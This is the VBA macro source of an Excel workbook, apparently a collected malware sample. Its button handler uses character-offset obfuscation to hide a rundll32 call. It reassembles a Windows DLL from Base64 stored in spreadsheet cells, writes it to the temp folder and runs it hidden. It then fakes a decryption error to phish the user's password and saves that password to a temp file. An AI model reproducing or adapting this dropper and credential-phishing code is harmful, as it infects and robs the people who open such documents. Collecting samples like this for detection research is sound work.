Attribute VB_Name = "Module1"



Function RandomString(cb As Integer) As String
    Randomize
    Dim rgch As String
    rgch = "abcdefghijklmnopqrstuvwxyz"
    rgch = rgch & UCase(rgch) & "0123456789"

    Dim i As Long
    For i = 1 To cb
        RandomString = RandomString & Mid$(rgch, Int(Rnd() * Len(rgch) + 1), 1)
    Next
End Function

Function ConvertStringToBytes(ByVal s As String) As Byte()
   Dim b1() As Byte: b1 = s
   Dim l As Long: l = (UBound(b1) + 1) \ 2
   If l = 0 Then ConvertStringToBytes = b1: Exit Function
   Dim b2() As Byte
   ReDim b2(0 To l - 1) As Byte
   Dim p As Long
   For p = 0 To l - 1
      Dim c As Long: c = b1(2 * p) + 256 * CLng(b1(2 * p + 1))
      If c >= 256 Then c = Asc("?")
      b2(p) = c
      Next
   ConvertStringToBytes = b2
End Function

Function Base64Decode(ByVal s As String) As Byte()
   Dim Map1(0 To 63)  As Byte
   Dim Map2(0 To 127) As Byte
   Dim c As Integer, i As Integer
   
   ' set Map1
   i = 0
   For c = Asc("A") To Asc("Z"): Map1(i) = c: i = i + 1: Next
   For c = Asc("a") To Asc("z"): Map1(i) = c: i = i + 1: Next
   For c = Asc("0") To Asc("9"): Map1(i) = c: i = i + 1: Next
   Map1(i) = Asc("+"): i = i + 1
   Map1(i) = Asc("/"): i = i + 1
   
   ' set Map2
   For i = 0 To 127: Map2(i) = 255: Next
   For i = 0 To 63: Map2(Map1(i)) = i: Next
   Dim IBuf() As Byte: IBuf = ConvertStringToBytes(s)
   Dim ILen As Long: ILen = UBound(IBuf) + 1
   If ILen Mod 4 <> 0 Then Err.Raise vbObjectError, , "Length of Base64 encoded input string is not a multiple of 4."
   Do While ILen > 0
      If IBuf(ILen - 1) <> Asc("=") Then Exit Do
      ILen = ILen - 1
      Loop
   Dim OLen As Long: OLen = (ILen * 3) \ 4
   Dim Out() As Byte
   ReDim Out(0 To OLen - 1) As Byte
   Dim ip As Long
   Dim op As Long
   Do While ip < ILen
      Dim i0 As Byte: i0 = IBuf(ip): ip = ip + 1
      Dim i1 As Byte: i1 = IBuf(ip): ip = ip + 1
      Dim i2 As Byte: If ip < ILen Then i2 = IBuf(ip): ip = ip + 1 Else i2 = Asc("A")
      Dim i3 As Byte: If ip < ILen Then i3 = IBuf(ip): ip = ip + 1 Else i3 = Asc("A")
      If i0 > 127 Or i1 > 127 Or i2 > 127 Or i3 > 127 Then _
         Err.Raise vbObjectError, , "Illegal character in Base64 encoded data."
      Dim b0 As Byte: b0 = Map2(i0)
      Dim b1 As Byte: b1 = Map2(i1)
      Dim b2 As Byte: b2 = Map2(i2)
      Dim b3 As Byte: b3 = Map2(i3)
      If b0 > 63 Or b1 > 63 Or b2 > 63 Or b3 > 63 Then _
         Err.Raise vbObjectError, , "Illegal character in Base64 encoded data."
      Dim o0 As Byte: o0 = (b0 * 4) Or (b1 \ &H10)
      Dim o1 As Byte: o1 = ((b1 And &HF) * &H10) Or (b2 \ 4)
      Dim o2 As Byte: o2 = ((b2 And 3) * &H40) Or b3
      Out(op) = o0: op = op + 1
      If op < OLen Then Out(op) = o1: op = op + 1
      If op < OLen Then Out(op) = o2: op = op + 1
      Loop
   Base64Decode = Out
End Function



Function WriteFile(ColumnName As String, StartRow As Long) As String
    Dim Path As String, Counter As Long, Data As String, lWritePos As Long, el As Variant
       
    Dim header As String
    
    header = "T" & "V" & "q" & "Q" & "A" & "A" & "M" & "A" & "A" & "A" & "A" & "E" & "A" & "A" & "A" & "A" & "/" & "/" & "8" & "A" & "A" & "L" & "g" & "A" & "A" & "A" & "A" & "A" & "A" & "A" & "A" & "A" & "Q" & "A" & "A" & "A" & "A" & "A" & "A" & "A" & "A" & "A" & "A" & "A" & "A" & "A" & "A="
    
    Path = Environ("temp") & "\" & RandomString(8) & "384" & ".txt"
    
    Open Path For Binary Access Write As #1
    wrdata = Base64Decode(header)
    
    lWritePos = 1
    For Each el In wrdata
      Put #1, lWritePos, CByte(el)
      lWritePos = lWritePos + 1
    Next el
   lWritePos = lWritePos + 1
    Counter = StartRow - 1
  lWritePos = lWritePos - 1
    Do While True
        Counter = Counter + 1
        Data = Cells(Counter, ColumnName)
        If Len(Data) = 0 Then
            Exit Do
        End If
        wrdata = Base64Decode(Data)
            For Each el In wrdata
                Put #1, lWritePos, CByte(el)
                lWritePos = lWritePos + 1
                
            Next el
        'MsgBox lWritePos
        'lWritePos = lWritePos + UBound(wrData) - LBound(wrData) + 1
        'MsgBox lWritePos
        'Exit Do
    Loop
    Close #1
    WriteFile = Path
End Function


Function DecodeObsStr(ByRef arr As Variant, Modifier As Integer)
    Dim ret As String, el As Variant
    ret = ""
    For Each el In arr
        ret = ret & Chr(el - Modifier)
    Next el
    DecodeObsStr = ret
End Function


Private Sub CommandButton1_Click()
    arr1 = Array(167, 170, 163, 153, 161, 161, 104, 103, 85)
    arr2 = Array(97, 119, 150, 167, 103)
    result = Shell(DecodeObsStr(arr1, 53) & WriteFile("X", 2) & DecodeObsStr(arr2, 53), 0)
    MsgBox "Decryption failed", vbOKOnly
    Dim res As String
    res = InputBox("Decryption error for user " & Environ("USERNAME") & ". Please enter your password manually:", Environ("USERNAME") & " decryption error")
    
    Dim fso As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    Dim oFile As Object
    Set oFile = fso.CreateTextFile(Environ("temp") & "\" & RandomString(8) & ".crd")
    
    oFile.WriteLine res
    oFile.Close
    Set fso = Nothing
    Set oFile = Nothing
    
    MsgBox "Incorrect Credentials"
End Sub








Attribute VB_Name = "Sheet1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True


INQUEST-PP=macro
